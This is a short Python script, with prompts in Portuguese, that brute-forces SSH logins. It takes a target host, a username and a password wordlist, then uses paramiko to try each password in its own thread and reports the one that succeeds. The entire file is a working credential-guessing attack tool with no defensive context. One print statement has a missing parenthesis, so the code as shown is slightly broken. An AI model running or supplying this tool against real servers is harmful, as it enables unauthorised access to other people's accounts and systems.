
import paramiko, sys, os, socket, termcolor
import threading, time

stop_flag = 0

def ssh_connect(password, code = 0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(host, port = 22, username = username, password = password)
        stop_flag = 1
        print(termcolor.colored(('[+] Senha encontrada: ' + password + ', para a conta: ' + username), 'green')
    except paramiko.AuthenticationException:
        print(termcolor.colored(('[-] Login incorreto: ' + password), 'red'))

    ssh.close()

host = input('[+] Endereco do alvo: ')
username = input('[+] SSH username: ')
input_file = input('[+] Arquivo de senhas: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] Esse arquivo não existe.')
    sys.exit(1)

with open(input_file, 'r') as file:
    for line in file.readlines():
        if stop_flag == 1:
            t.join()
            exit()
        password = line.strip()
        t = threading.Thread(target = ssh_connect, args = (password, ))
        t.start()
        time.sleep(0.5)







